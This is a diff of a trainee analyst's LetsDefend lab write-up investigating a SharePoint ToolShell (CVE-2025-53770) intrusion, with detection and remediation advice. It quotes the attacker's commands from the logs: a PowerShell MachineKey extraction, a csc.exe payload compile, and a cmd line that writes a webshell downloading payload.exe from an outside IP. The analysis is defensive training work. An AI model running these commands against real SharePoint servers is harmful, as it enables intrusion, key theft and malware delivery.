@@ -54,18 +54,25 @@ I Checked the NVD for CVE-2025-53770 so i could get a better understanding of th
 
 ### Step 1: Initial Alert Triage & Scope Definition
 * **Alert Signal:** SIEM triggered a high-severity alert (`SOC342`) for an abnormal request sequence targeted at the internal SharePoint web application.
-* **Objective:** Verify whether the incoming HTTP payload was successful (HTTP `200 OK` response) and evaluate whether process creation events followed the web request.
+* **Objective:** Verify whether the incoming HTTP payload was successful and evaluate whether process creation events followed the web request.
 
-### Step 2: Network & Web Server Log Analysis
+### Step 2. Network & Web Server Log Analysis
 * **Web Server / WAF Logs Analysis:**
   * After I checked network logs I, seen attacker IP (107.191.58.76) revealed HTTP traffic directed at SharePoint01:Request Type: HTTP POST  Target Endpoint: /_layouts/15/ToolPane.aspx?DisplayMode=Edit
   * Vulnerability Context (CVE-2025-53770):The combination of the POST payload to ToolPane.aspx along with the manipulated SignOut.aspx referer bypasses SharePoint's authentication checks (ToolShell flaw).  This grant allowed the remote attacker to drop ASPX files into the web root without authenticating.
+
+<img width="1426" height="690" alt="chrome_QSRrIk8qM9" src="https://github.com/user-attachments/assets/bf8e0b58-f133-4ee0-bd63-d785d6607872" />
+
+
+| Anomaly | Description |
+|---------|-------------|
+| **Spoofed Referer** | Set to `/layouts/SignOut.aspx` to appear to be real |
+| **Payload size** | **7,699 bytes** of encoded data |
+| **No Authentication Headers** | Exploiting a known bypass flaw |
  
 
-
-
   
-### Step 3: Endpoint Behavioral Analysis & Payload Verification
+### Step 3. Endpoint Behavioral Analysis & Payload Verification
 Analyzing EDR/Endpoint process trees and command lines on `SharePoint01` confirmed remote command execution:
 
 1. **Malicious Process Execution Chain:**
@@ -95,12 +102,24 @@ public void Page_load()
 }
 </script>
 
-What This Script Does
-This script abuses .NET reflection to access private configuration and extract:
+### Step 4. MachineKey Extraction & Credential Harvesting
 
-ValidationKey
-DecryptionKey
-Encryption mode + compatibility settings
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"
+
+In this final observed stage, the attacker executed a targeted PowerShell command to call the .NET GetApplicationConfig() method. This directly queried the server's core ASP.NET cryptographic configuration to harvest sensitive keys, including:
+
+ValidationKey & DecryptionKey
+
+Encryption mode & compatibility settings
+
+Threat Impact
+The extraction of these machine-level secrets represents a high-severity post-exploitation risk. With valid MachineKeys, an adversary can:
+
+Forge Valid ViewState & Session Tokens: Craft custom ASP.NET ViewState payloads to achieve persistent, unauthenticated Remote Code Execution (RCE).
+
+Bypass Authentication: Mint arbitrary identity tokens or cookies across SharePoint and any adjacent web applications sharing the same MachineKey configuration.
+
+Decrypt Protected Data: Unmask sensitive application state and encrypted data stored in memory or cookies.
 
 after that 
 
@@ -109,10 +128,13 @@ csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
 cmd.exe /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form>> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
 
    
-## Malicious ASPX Webshell (spinstall0.aspx)
-Creates a malicious ASPX file (spinstall0.aspx) directly in the SharePoint layouts directory
-Embeds an <object> ActiveX tag that points to: http://107.191.58.76/payload.exe
-Acts as a remote downloader when the page is visited by a browser or triggered internally
+## Step 5. Malicious ASPX Webshell (`spinstall0.aspx`)
+
+The command reconstructed from EDR logs generated `spinstall0.aspx` directly in the SharePoint layout path:
+
+1. **Web Shell Creation:** Writes a malicious ASPX file to `...\TEMPLATE\LAYOUTS\spinstall0.aspx`.
+2. **Control Tag Embedding:** Injects an `<object>` ActiveX control configured with redirection parameters pointing to an external staging server (`http://107.191.58.76/payload.exe`).
+3. **Trigger & Download:** Functions as a remote downloader, initiating external payload retrieval when accessed via a browser or invoked by local system tasks.
 
 * To make sure APSX file is malicious we checked Virus Total and Threat Detection Tab.
 
@@ -124,7 +146,7 @@ Acts as a remote downloader when the page is visited by a browser or triggered i
 
 ---
 
-## 4. Root Cause Analysis & Detection Findings
+## Step 6. Root Cause Analysis & Detection Findings
 
 * **Root Cause:** An unpatched, network-accessible Microsoft SharePoint application vulnerable to **CVE-2025-53770**, which allowed authentication bypass and arbitrary code execution.
 * **Key Indicators of Compromise (IOCs):**
@@ -133,7 +155,7 @@ Acts as a remote downloader when the page is visited by a browser or triggered i
 
 ---
 
-## 5. Containment, Eradication & Remediation
+## Step 7. Containment, Eradication & Remediation
 
 1. **Host Isolation:** Isolated the target SharePoint server from the internal network via EDR control to prevent lateral movement while keeping agent communication open for investigation.
 2. **Process Termination & Artifact Cleanup:** Terminated active malicious `cmd.exe`/`powershell.exe` processes and removed any web shell files dropped on the host.
@@ -142,8 +164,26 @@ Acts as a remote downloader when the page is visited by a browser or triggered i
 
 ---
 
-## 6. Defensive Recommendations
+## Artifacts and Reporting
+
+<img width="1750" height="824" alt="chrome_8Pj0AUvLsl" src="https://github.com/user-attachments/assets/a10c614d-1be8-4cb6-b51e-e07991bda0a3" />
+
+---
+
+## Defensive Recommendations
 
 * **Process Spawning Detection:** Deploy SIEM/EDR detection rules flagging any command shell process (`cmd.exe`, `powershell.exe`, `wmic.exe`) spawned by web server processes (`w3wp.exe`, `httpd`, `nginx`).
 * **WAF Filtering:** Configure Web Application Firewall signatures to inspect and block malformed HTTP header combinations targeting SharePoint internal endpoints.
 * **Least Privilege Enforcement:** Enforce strict service account privileges so web application pools lack rights to interact with host administrative utilities.
+
+---
+
+
+## Summary
+
+Key Takeaways & Analyst Reflections
+Investigating this incident provided valuable practical experience in analyzing complex post-exploitation behaviors associated with CVE-2025-53770. Deconstructing the attack chain—from initial HTTP authentication bypass to memory key extraction and web shell creation underscores the critical necessity of rapid patch management for public facing enterprise assets. Hands-on scenarios like this on platform tools like LetsDefend continue to sharpen my threat analysis, log reconstruction, and incident handling capabilities as I prepare for a SOC Analyst role.
+
+
+<img width="1429" height="667" alt="chrome_MVTNeoPWRu" src="https://github.com/user-attachments/assets/687dc006-2a6f-4078-89d1-036ad0d33158" />
+
